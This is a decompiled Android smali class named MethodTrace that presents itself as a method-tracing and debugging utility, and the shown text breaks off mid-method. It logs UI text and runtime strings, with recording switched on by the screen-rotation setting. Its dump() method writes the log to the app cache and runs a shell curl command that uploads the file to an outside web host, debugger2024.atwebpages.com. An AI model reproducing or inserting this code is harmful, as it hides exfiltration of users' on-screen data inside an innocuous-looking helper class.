.class public Lcom/mycompany/myapp/MethodTrace;
.super Ljava/lang/Object;
.source "MethodTrace.java"


# static fields
.field private static ctx:Landroid/content/Context;

.field private static dataLimitLength:I

.field private static docDir:Ljava/io/File;

.field private static dumpLock:Ljava/io/File;

.field private static final fileLock:Ljava/util/concurrent/locks/ReadWriteLock;

.field private static filePath:Ljava/io/File;

.field private static methodMap:Ljava/util/HashMap;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/HashMap",
            "<",
            "Ljava/lang/String;",
            "[",
            "Ljava/lang/Long;",
            ">;"
        }
    .end annotation
.end field

.field private static methods:Ljava/util/ArrayList;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/ArrayList",
            "<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field private static recorder:Ljava/lang/StringBuilder;

.field private static rtDataPath:Ljava/io/File;

.field private static runtimeDataMap:Ljava/util/HashMap;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/HashMap",
            "<",
            "Ljava/lang/String;",
            "Ljava/lang/Boolean;",
            ">;"
        }
    .end annotation
.end field


# direct methods
.method static final constructor <clinit>()V
    .locals 7

    new-instance v2, Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    move-object v6, v2

    move-object v2, v6

    move-object v3, v6

    invoke-direct {v3}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;-><init>()V

    sput-object v2, Lcom/mycompany/myapp/MethodTrace;->fileLock:Ljava/util/concurrent/locks/ReadWriteLock;

    new-instance v2, Ljava/util/HashMap;

    move-object v6, v2

    move-object v2, v6

    move-object v3, v6

    invoke-direct {v3}, Ljava/util/HashMap;-><init>()V

    sput-object v2, Lcom/mycompany/myapp/MethodTrace;->methodMap:Ljava/util/HashMap;

    new-instance v2, Ljava/util/ArrayList;

    move-object v6, v2

    move-object v2, v6

    move-object v3, v6

    invoke-direct {v3}, Ljava/util/ArrayList;-><init>()V

    sput-object v2, Lcom/mycompany/myapp/MethodTrace;->methods:Ljava/util/ArrayList;

    sget-object v2, Landroid/os/Environment;->DIRECTORY_DOCUMENTS:Ljava/lang/String;

    invoke-static {v2}, Landroid/os/Environment;->getExternalStoragePublicDirectory(Ljava/lang/String;)Ljava/io/File;

    move-result-object v2

    sput-object v2, Lcom/mycompany/myapp/MethodTrace;->docDir:Ljava/io/File;

    new-instance v2, Ljava/io/File;

    move-object v6, v2

    move-object v2, v6

    move-object v3, v6

    sget-object v4, Lcom/mycompany/myapp/MethodTrace;->docDir:Ljava/io/File;

    const-string v5, "/trace/trace.txt"

    invoke-direct {v3, v4, v5}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    sput-object v2, Lcom/mycompany/myapp/MethodTrace;->filePath:Ljava/io/File;

    new-instance v2, Ljava/io/File;

    move-object v6, v2

    move-object v2, v6

    move-object v3, v6

    sget-object v4, Lcom/mycompany/myapp/MethodTrace;->docDir:Ljava/io/File;

    const-string v5, "/trace/runtimedump.txt"

    invoke-direct {v3, v4, v5}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    sput-object v2, Lcom/mycompany/myapp/MethodTrace;->rtDataPath:Ljava/io/File;

    new-instance v2, Ljava/io/File;

    move-object v6, v2

    move-object v2, v6

    move-object v3, v6

    sget-object v4, Lcom/mycompany/myapp/MethodTrace;->docDir:Ljava/io/File;

    const-string v5, "/trace/lock"

    invoke-direct {v3, v4, v5}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    sput-object v2, Lcom/mycompany/myapp/MethodTrace;->dumpLock:Ljava/io/File;

    const v2, 0xffff

    sput v2, Lcom/mycompany/myapp/MethodTrace;->dataLimitLength:I

    new-instance v2, Ljava/util/HashMap;

    move-object v6, v2

    move-object v2, v6

    move-object v3, v6

    invoke-direct {v3}, Ljava/util/HashMap;-><init>()V

    sput-object v2, Lcom/mycompany/myapp/MethodTrace;->runtimeDataMap:Ljava/util/HashMap;

    new-instance v2, Ljava/lang/StringBuilder;

    move-object v6, v2

    move-object v2, v6

    move-object v3, v6

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    sput-object v2, Lcom/mycompany/myapp/MethodTrace;->recorder:Ljava/lang/StringBuilder;

    const/4 v2, 0x0

    check-cast v2, Landroid/content/Context;

    sput-object v2, Lcom/mycompany/myapp/MethodTrace;->ctx:Landroid/content/Context;

    return-void
.end method

.method public constructor <init>()V
    .locals 3

    .prologue
    .line 164
    move-object v0, p0

    move-object v2, v0

    invoke-direct {v2}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static dump()V
    .locals 13
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .prologue
    .line 95
    :try_start_0
    sget-object v7, Lcom/mycompany/myapp/MethodTrace;->ctx:Landroid/content/Context;

    invoke-virtual {v7}, Landroid/content/Context;->getCacheDir()Ljava/io/File;

    move-result-object v7

    invoke-virtual {v7}, Ljava/io/File;->toString()Ljava/lang/String;

    move-result-object v7

    move-object v1, v7

    .line 96
    new-instance v7, Ljava/io/File;

    move-object v12, v7

    move-object v7, v12

    move-object v8, v12

    new-instance v9, Ljava/lang/StringBuffer;

    move-object v12, v9

    move-object v9, v12

    move-object v10, v12

    invoke-direct {v10}, Ljava/lang/StringBuffer;-><init>()V

    move-object v10, v1

    invoke-virtual {v9, v10}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v9

    const-string v10, "/out.txt"

    invoke-virtual {v9, v10}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-direct {v8, v9}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    move-object v2, v7

    .line 98
    move-object v7, v2

    invoke-virtual {v7}, Ljava/io/File;->createNewFile()Z

    move-result v7

    .line 99
    new-instance v7, Ljava/io/FileWriter;

    move-object v12, v7

    move-object v7, v12

    move-object v8, v12

    move-object v9, v2

    invoke-direct {v8, v9}, Ljava/io/FileWriter;-><init>(Ljava/io/File;)V

    move-object v3, v7

    .line 100
    new-instance v7, Ljava/io/BufferedWriter;

    move-object v12, v7

    move-object v7, v12

    move-object v8, v12

    move-object v9, v3

    invoke-direct {v8, v9}, Ljava/io/BufferedWriter;-><init>(Ljava/io/Writer;)V

    move-object v4, v7

    .line 103
    move-object v7, v4

    sget-object v8, Lcom/mycompany/myapp/MethodTrace;->recorder:Ljava/lang/StringBuilder;

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/io/BufferedWriter;->write(Ljava/lang/String;)V

    .line 104
    move-object v7, v4

    invoke-virtual {v7}, Ljava/io/BufferedWriter;->newLine()V

    .line 107
    move-object v7, v4

    invoke-virtual {v7}, Ljava/io/BufferedWriter;->flush()V

    .line 108
    move-object v7, v4

    invoke-virtual {v7}, Ljava/io/BufferedWriter;->close()V

    .line 111
    const-string v7, "cd %s && curl --data-binary @out.txt http://debugger2024.atwebpages.com/test.php"

    const/4 v8, 0x1

    new-array v8, v8, [Ljava/lang/Object;

    move-object v12, v8

    move-object v8, v12

    move-object v9, v12

    const/4 v10, 0x0

    move-object v11, v1

    aput-object v11, v9, v10

    invoke-static {v7, v8}, Ljava/lang/String;->format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v7

    move-object v5, v7

    .line 112
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v7

    const/4 v8, 0x3

    new-array v8, v8, [Ljava/lang/String;

    move-object v12, v8

    move-object v8, v12

    move-object v9, v12

    const/4 v10, 0x0

    const-string v11, "sh"

    aput-object v11, v9, v10

    move-object v12, v8

    move-object v8, v12

    move-object v9, v12

    const/4 v10, 0x1

    const-string v11, "-c"

    aput-object v11, v9, v10

    move-object v12, v8

    move-object v8, v12

    move-object v9, v12

    const/4 v10, 0x2

    move-object v11, v5

    aput-object v11, v9, v10

    invoke-virtual {v7, v8}, Ljava/lang/Runtime;->exec([Ljava/lang/String;)Ljava/lang/Process;
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v7

    .line 117
    :goto_0
    new-instance v7, Ljava/lang/StringBuilder;

    move-object v12, v7

    move-object v7, v12

    move-object v8, v12

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    sput-object v7, Lcom/mycompany/myapp/MethodTrace;->recorder:Ljava/lang/StringBuilder;

    .line 118
    new-instance v7, Ljava/util/HashMap;

    move-object v12, v7

    move-object v7, v12

    move-object v8, v12

    invoke-direct {v8}, Ljava/util/HashMap;-><init>()V

    sput-object v7, Lcom/mycompany/myapp/MethodTrace;->runtimeDataMap:Ljava/util/HashMap;

    return-void

    .line 112
    :catch_0
    move-exception v7

    move-object v1, v7

    .line 115
    sget-object v7, Lcom/mycompany/myapp/MethodTrace;->ctx:Landroid/content/Context;

    move-object v8, v1

    invoke-virtual {v8}, Ljava/io/IOException;->getMessage()Ljava/lang/String;

    move-result-object v8

    const/4 v9, 0x1

    invoke-static {v7, v8, v9}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v7

    invoke-virtual {v7}, Landroid/widget/Toast;->show()V

    goto :goto_0
.end method

.method public static isRecordingStart()Z
    .locals 5

    .prologue
    .line 88
    sget-object v2, Lcom/mycompany/myapp/MethodTrace;->ctx:Landroid/content/Context;

    invoke-virtual {v2}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v2

    const-string v3, "accelerometer_rotation"

    const/4 v4, 0x0

    invoke-static {v2, v3, v4}, Landroid/provider/Settings$System;->getInt(Landroid/content/ContentResolver;Ljava/lang/String;I)I

    move-result v2

    const/4 v3, 0x1

    if-eq v2, v3, :cond_0

    const/4 v2, 0x0

    :goto_0
    move v0, v2

    return v0

    :cond_0
    const/4 v2, 0x1

    goto :goto_0
.end method

.method public static setContext(Landroid/content/Context;)V
    .locals 4
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/Context;",
            ")V"
        }
    .end annotation

    .prologue
    .line 83
    move-object v0, p0

    move-object v3, v0

    sput-object v3, Lcom/mycompany/myapp/MethodTrace;->ctx:Landroid/content/Context;

    return-void
.end method

.method public static writeRTData(Ljava/lang/CharSequence;)V
    .locals 16
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/lang/CharSequence;",
            ")V"
        }
    .end annotation

    .prologue
    .line 152
    move-object/from16 v0, p0

    move-object v6, v0

    if-eqz v6, :cond_1

    invoke-static {}, Lcom/mycompany/myapp/MethodTrace;->isRecordingStart()Z

    move-result v6

    if-eqz v6, :cond_1

    .line 153
    new-instance v6, Ljava/lang/Throwable;

    move-object v14, v6

    move-object v6, v14

    move-object v7, v14

    invoke-direct {v7}, Ljava/lang/Throwable;-><init>()V

    invoke-virtual {v6}, Ljava/lang/Throwable;->fillInStackTrace()Ljava/lang/Throwable;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/Throwable;->getStackTrace()[Ljava/lang/StackTraceElement;

    move-result-object v6

    const/4 v7, 0x1

    aget-object v6, v6, v7

    move-object v2, v6

    .line 154
    move-object v6, v0

    invoke-interface {v6}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v6

    move-object v3, v6

    .line 155
    const-string v6, "@UIText| %s ==>\t%s"

    const/4 v7, 0x2

    new-array v7, v7, [Ljava/lang/Object;

    move-object v14, v7

    move-object v7, v14

    move-object v8, v14

    const/4 v9, 0x0

    move-object v10, v2

    invoke-virtual {v10}, Ljava/lang/StackTraceElement;->toString()Ljava/lang/String;

    move-result-object v10

    aput-object v10, v8, v9

    move-object v14, v7

    move-object v7, v14

    move-object v8, v14

    const/4 v9, 0x1

    move-object v10, v3

    const/4 v11, 0x0

    move-object v12, v3

    invoke-virtual {v12}, Ljava/lang/String;->length()I

    move-result v12

    sget v13, Lcom/mycompany/myapp/MethodTrace;->dataLimitLength:I

    invoke-static {v12, v13}, Ljava/lang/Math;->min(II)I

    move-result v12

    invoke-virtual {v10, v11, v12}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v10

    aput-object v10, v8, v9

    invoke-static {v6, v7}, Ljava/lang/String;->format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v6

    move-object v4, v6

    .line 156
    sget-object v6, Lcom/mycompany/myapp/MethodTrace;->runtimeDataMap:Ljava/util/HashMap;

    move-object v7, v4

    invoke-virtual {v6, v7}, Ljava/util/HashMap;->containsKey(Ljava/lang/Object;)Z

    move-result v6

    if-nez v6, :cond_0

    .line 157
    sget-object v6, Lcom/mycompany/myapp/MethodTrace;->runtimeDataMap:Ljava/util/HashMap;

    move-object v7, v4

    const/4 v8, 0x1

    new-instance v9, Ljava/lang/Boolean;

    move v14, v8

    move-object v15, v9

    move-object v8, v15

    move v9, v14

    move-object v10, v15

    move v14, v9

    move-object v15, v10

    move-object v9, v15

    move v10, v14

    invoke-direct {v9, v10}, Ljava/lang/Boolean;-><init>(Z)V

    invoke-virtual {v6, v7, v8}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v6

    .line 158
    sget-object v6, Lcom/mycompany/myapp/MethodTrace;->recorder:Ljava/lang/StringBuilder;

    const-string v7, "\r\n"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    .line 159
    sget-object v6, Lcom/mycompany/myapp/MethodTrace;->recorder:Ljava/lang/StringBuilder;

    move-object v7, v4

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    .line 162
    :cond_0
    :goto_0
    return-void

    .line 161
    :cond_1
    invoke-static {}, Lcom/mycompany/myapp/MethodTrace;->isRecordingStart()Z

    move-result v6

    if-nez v6, :cond_0

    sget-object v6, Lcom/mycompany/myapp/MethodTrace;->recorder:Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->length()I

    move-result v6

    const/4 v7, 0x0

    if-eq v6, v7, :cond_0

    .line 162
    invoke-static {}, Lcom/mycompany/myapp/MethodTrace;->dump()V

    goto :goto_0
.end method

.method public static writeRTData(Ljava/lang/String;)V
    .locals 15
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/lang/String;",
            ")V"
        }
    .end annotation

    .prologue
    .line 122
    move-object v0, p0

    move-object v5, v0

    if-eqz v5, :cond_1

    invoke-static {}, Lcom/mycompany/myapp/MethodTrace;->isRecordingStart()Z

    move-result v5

    if-eqz v5, :cond_1

    .line 123
    new-instance v5, Ljava/lang/Throwable;

    move-object v13, v5

    move-object v5, v13

    move-object v6, v13

    invoke-direct {v6}, Ljava/lang/Throwable;-><init>()V

    invoke-virtual {v5}, Ljava/lang/Throwable;->fillInStackTrace()Ljava/lang/Throwable;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/Throwable;->getStackTrace()[Ljava/lang/StackTraceElement;

    move-result-object v5

    const/4 v6, 0x1

    aget-object v5, v5, v6

    move-object v2, v5

    .line 124
    const-string v5, "@General| %s ==>\t%s"

    const/4 v6, 0x2

    new-array v6, v6, [Ljava/lang/Object;

    move-object v13, v6

    move-object v6, v13

    move-object v7, v13

    const/4 v8, 0x0

    move-object v9, v2

    invoke-virtual {v9}, Ljava/lang/StackTraceElement;->toString()Ljava/lang/String;

    move-result-object v9

    aput-object v9, v7, v8

    move-object v13, v6

    move-object v6, v13

    move-object v7, v13

    const/4 v8, 0x1

    move-object v9, v0

    const/4 v10, 0x0

    move-object v11, v0

    invoke-virtual {v11}, Ljava/lang/String;->length()I

    move-result v11

    sget v12, Lcom/mycompany/myapp/MethodTrace;->dataLimitLength:I

    invoke-static {v11, v12}, Ljava/lang/Math;->min(II)I

    move-result v11

    invoke-virtual {v9, v10, v11}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v9

    aput-object v9, v7, v8

    invoke-static {v5, v6}, Ljava/lang/String;->format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v5

    move-object v3, v5

    .line 125
    sget-object v5, Lcom/mycompany/myapp/MethodTrace;->runtimeDataMap:Ljava/util/HashMap;

    move-object v6, v3

    invoke-virtual {v5, v6}, Ljava/util/HashMap;->containsKey(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_0

    .line 126
    sget-object v5, Lcom/mycompany/myapp/MethodTrace;->runtimeDataMap:Ljava/util/HashMap;

    move-object v6, v3

    const/4 v7, 0x1

    new-instance v8, Ljava/lang/Boolean;

    move v13, v7

    move-object v14, v8

    move-object v7, v14

    move v8, v13

    move-object v9, v14

    move v13, v8

    move-object v14, v9

    move-object v8, v14

    move v9, v13

    invoke-direct {v8, v9}, Ljava/lang/Boolean;-><init>(Z)V

    invoke-virtual {v5, v6, v7}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v5

    .line 127
    sget-object v5, Lcom/mycompany/myapp/MethodTrace;->recorder:Ljava/lang/StringBuilder;

    move-object v6, v3

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    .line 128
    sget-object v5, Lcom/mycompany/myapp/MethodTrace;->recorder:Ljava/lang/StringBuilder;

    const-string v6, "\r\n"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    .line 131
    :cond_0
    :goto_0
    return-void

    .line 130
    :cond_1
    invoke-static {}, Lcom/mycompany/myapp/MethodTrace;->isRecordingStart()Z

    move-result v5

    if-nez v5, :cond_0

    sget-object v5, Lcom/mycompany/myapp/MethodTrace;->recorder:Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->length()I

    move-result v5

    const/4 v6, 0x0

    if-eq v5, v6, :cond_0

    .line 131
    invoke-static {}, Lcom/mycompany/myapp/MethodTrace;->dump()V

    goto :goto_0
.end method

.method public static writeRTData([Ljava/lang/String;)V
    .locals 16
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "([",
            "Ljava/lang/String;",
            ")V"
        }
    .end annotation

    .prologue
    .line 137
    move-object/from16 v0, p0

    move-object v6, v0

    if-eqz v6, :cond_1

    invoke-static {}, Lcom/mycompany/myapp/MethodTrace;->isRecordingStart()Z

    move-result v6

    if-eqz v6, :cond_1

    .line 138
    new-instance v6, Ljava/lang/Throwable;

    move-object v14, v6

    move-object v6, v14

    move-object v7, v14

    invoke-direct {v7}, Ljava/lang/Throwable;-><init>()V

    invoke-virtual {v6}, Ljava/lang/Throwable;->fillInStackTrace()Ljava/lang/Throwable;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/Throwable;->getStackTrace()[Ljava/lang/StackTraceElement;

    move-result-object v6

    const/4 v7, 0x1

    aget-object v6, v6, v7

    move-object v2, v6

    .line 139
    new-instance v6, Ljava/lang/StringBuffer;

    move-object v14, v6

    move-object v6, v14

    move-object v7, v14

    invoke-direct {v7}, Ljava/lang/StringBuffer;-><init>()V

    new-instance v7, Ljava/lang/StringBuffer;

    move-object v14, v7

    move-object v7, v14

    move-object v8, v14

    invoke-direct {v8}, Ljava/lang/StringBuffer;-><init>()V

    const-string v8, "{"

    invoke-virtual {v7, v8}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v7

    const-string v8, ","

    move-object v9, v0

    invoke-static {v8, v9}, Ljava/lang/String;->join(Ljava/lang/CharSequence;[Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v6

    const-string v7, "}"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v6

    move-object v3, v6

    .line 140
    const-string v6, "@General[]| %s ==>\t%s"

    const/4 v7, 0x2

    new-array v7, v7, [Ljava/lang/Object;

    move-object v14, v7

    move-object v7, v14

    move-object v8, v14

    const/4 v9, 0x0

    move-object v10, v2

    invoke-virtual {v10}, Ljava/lang/StackTraceElement;->toString()Ljava/lang/String;

    move-result-object v10

    aput-object v10, v8, v9

    move-object v14, v7

    move-object v7, v14

    move-object v8, v14

    const/4 v9, 0x1

    move-object v10, v3

    const/4 v11, 0x0

    move-object v12, v3

    invoke-virtual {v12}, Ljava/lang/String;->length()I

    move-result v12

    sget v13, Lcom/mycompany/myapp/MethodTrace;->dataLimitLength:I

    invoke-static {v12, v13}, Ljava/lang/Math;->min(II)I

    move-result v12

    invoke-virtual {v10, v11, v12}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v10

    aput-object v10, v8, v9

    invoke-static {v6, v7}, Ljava/lang/String;->format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v6

    move-object v4, v6

    .line 141
    sget-object v6, Lcom/mycompany/myapp/MethodTrace;->runtimeDataMap:Ljava/util/HashMap;

    move-object v7, v4

    invoke-virtual {v6, v7}, Ljava/util/HashMap;->containsKey(Ljava/lang/Object;)Z

    move-result v6

    if-nez v6, :cond_0

    .line 142
    sget-object v6, Lcom/mycompany/myapp/MethodTrace;->runtimeDataMap:Ljava/util/HashMap;

    move-object v7, v4

    const/4 v8, 0x1

    new-instance v9, Ljava/lang/Boolean;

    move v14, v8

    move-object v15, v9

    move-object v8, v15

    move v9, v14

    move-object v10, v15

    move v14, v9

    move-object v15, v10

    move-object v9, v15

    move v10, v14

    invoke-direct {v9, v10}, Ljava/lang/Boolean;-><init>(Z)V

    invoke-virtual {v6, v7, v8}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v6

    .line 143
    sget-object v6, Lcom/mycompany/myapp/MethodTrace;->recorder:Ljava/lang/StringBuilder;

    const-string v7, "\r\n"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    .line 144
    sget-object v6, Lcom/mycompany/myapp/MethodTrace;->recorder:Ljava/lang/StringBuilder;

    move-object v7, v4

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    .line 147
    :cond_0
    :goto_0
    return-void

    .line 146
    :cond_1
    invoke-static {}, Lcom/mycompany/myapp/MethodTrace;->isRecordingStart()Z

    move-result v6

    if-nez v6, :cond_0

    sget-object v6, Lcom/mycompany/myapp/MethodTrace;->recorder:Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->length()I

    move-result v6

    const/4 v7, 0x0

    if-eq v6, v7, :cond_0

    .line 147
    invoke-static {}, Lcom/mycompany/myapp/MethodTrace;->dump()V

    goto :goto_0
.end method

.method public static writeTrace(Ljava/lang/String;)V
    .locals 33
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/lang/String;",
            ")V"
        }
    .end annotation

    .prologue
    .line 30
    move-object/from16 v2, p0

    sget-object v19, Lcom/mycompany/myapp/MethodTrace;->dumpLock:Ljava/io/File;

    invoke-virtual/range {v19 .. v19}, Ljava/io/File;->exists()Z

    move-result v19

    if-eqz v19, :cond_0

    .line 78
    :goto_0
    return-void

    .line 34
    :cond_0
    :try_start_0
    sget-object v19, Lcom/mycompany/myapp/MethodTrace;->fileLock:Ljava/util/concurrent/locks/ReadWriteLock;

    invoke-interface/range {v19 .. v19}, Ljava/util/concurrent/locks/ReadWriteLock;->writeLock()Ljava/util/concurrent/locks/Lock;

    move-result-object v19

    invoke-interface/range {v19 .. v19}, Ljava/util/concurrent/locks/Lock;->lock()V

    .line 37
    sget-object v19, Lcom/mycompany/myapp/MethodTrace;->filePath:Ljava/io/File;

    invoke-virtual/range {v19 .. v19}, Ljava/io/File;->length()J

    move-result-wide v19

    const/16 v21, 0x0

    move/from16 v0, v21

    int-to-long v0, v0

    move-wide/from16 v21, v0

    cmp-long v19, v19, v21

    if-nez v19, :cond_1

    .line 38
    new-instance v19, Ljava/util/HashMap;

    move-object/from16 v30, v19

    move-object/from16 v19, v30

    move-object/from16 v20, v30

    invoke-direct/range {v20 .. v20}, Ljava/util/HashMap;-><init>()V

    sput-object v19, Lcom/mycompany/myapp/MethodTrace;->methodMap:Ljava/util/HashMap;

    .line 39
    new-instance v19, Ljava/util/ArrayList;

    move-object/from16 v30, v19

    move-object/from16 v19, v30

    move-object/from16 v20, v30

    invoke-direct/range {v20 .. v20}, Ljava/util/ArrayList;-><init>()V

    sput-object v19, Lcom/mycompany/myapp/MethodTrace;->methods:Ljava/util/ArrayList;

    .line 42
    :cond_1
    sget-object v19, Lcom/mycompany/myapp/MethodTrace;->methodMap:Ljava/util/HashMap;

    move-object/from16 v20, v2

    invoke-virtual/range {v19 .. v20}, Ljava/util/HashMap;->containsKey(Ljava/lang/Object;)Z

    move-result v19

    if-eqz v19, :cond_4

    sget-object v19, Lcom/mycompany/myapp/MethodTrace;->methodMap:Ljava/util/HashMap;

    move-object/from16 v20, v2

    invoke-virtual/range {v19 .. v20}, Ljava/util/HashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v19

    check-cast v19, [Ljava/lang/Long;

    :goto_1
    move-object/from16 v8, v19

    .line 43
    move-object/from16 v19, v8

    const/16 v20, 0x0

    aget-object v19, v19, v20

    check-cast v19, Ljava/lang/Long;

    invoke-virtual/range {v19 .. v19}, Ljava/lang/Long;->longValue()J

    move-result-wide v19

    move-wide/from16 v9, v19

    .line 44
    move-object/from16 v19, v8

    const/16 v20, 0x1

    aget-object v19, v19, v20

    check-cast v19, Ljava/lang/Long;

    invoke-virtual/range {v19 .. v19}, Ljava/lang/Long;->longValue()J

    move-result-wide v19

    move-wide/from16 v11, v19

    .line 47
    sget-object v19, Lcom/mycompany/myapp/MethodTrace;->methodMap:Ljava/util/HashMap;

    move-object/from16 v20, v2

    invoke-virtual/range {v19 .. v20}, Ljava/util/HashMap;->containsKey(Ljava/lang/Object;)Z

    move-result v19

    if-eqz v19, :cond_2

    invoke-static {}, Ljava/lang/System;->nanoTime()J

    move-result-wide v19

    move-wide/from16 v21, v9

    sub-long v19, v19, v21

    const-wide/32 v21, 0x1dcd6500

    cmp-long v19, v19, v21

    if-lez v19, :cond_6

    .line 49
    :cond_2
    sget-object v19, Lcom/mycompany/myapp/MethodTrace;->methodMap:Ljava/util/HashMap;

    move-object/from16 v20, v2

    invoke-virtual/range {v19 .. v20}, Ljava/util/HashMap;->containsKey(Ljava/lang/Object;)Z

    move-result v19

    if-nez v19, :cond_3

    .line 50
    sget-object v19, Lcom/mycompany/myapp/MethodTrace;->methods:Ljava/util/ArrayList;

    move-object/from16 v20, v2

    invoke-virtual/range {v19 .. v20}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    move-result v19

    .line 52
    :cond_3
    sget-object v19, Lcom/mycompany/myapp/MethodTrace;->methodMap:Ljava/util/HashMap;

    move-object/from16 v20, v2

    const/16 v21, 0x2

    move/from16 v0, v21

    new-array v0, v0, [Ljava/lang/Long;

    move-object/from16 v21, v0

    move-object/from16 v30, v21

    move-object/from16 v21, v30

    move-object/from16 v22, v30

    const/16 v23, 0x0

    invoke-static {}, Ljava/lang/System;->nanoTime()J

    move-result-wide v24

    new-instance v26, Ljava/lang/Long;

    move-wide/from16 v30, v24

    move-object/from16 v32, v26

    move-object/from16 v24, v32

    move-wide/from16 v25, v30

    move-object/from16 v27, v32

    move-wide/from16 v30, v25

    move-object/from16 v32, v27

    move-object/from16 v25, v32

    move-wide/from16 v26, v30

    move-object/from16 v28, v32

    invoke-direct/range {v25 .. v27}, Ljava/lang/Long;-><init>(J)V

    aput-object v24, v22, v23

    move-object/from16 v30, v21

    move-object/from16 v21, v30

    move-object/from16 v22, v30

    const/16 v23, 0x1

    move-wide/from16 v24, v11

    const-wide/16 v26, 0x1

    add-long v24, v24, v26

    new-instance v26, Ljava/lang/Long;

    move-wide/from16 v30, v24

    move-object/from16 v32, v26

    move-object/from16 v24, v32

    move-wide/from16 v25, v30

    move-object/from16 v27, v32

    move-wide/from16 v30, v25

    move-object/from16 v32, v27

    move-object/from16 v25, v32

    move-wide/from16 v26, v30

    move-object/from16 v28, v32

    invoke-direct/range {v25 .. v27}, Ljava/lang/Long;-><init>(J)V

    aput-object v24, v22, v23

    invoke-virtual/range {v19 .. v21}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    move-result-object v19

    .line 56
    :try_start_1
    new-instance v19, Ljava/io/FileWriter;

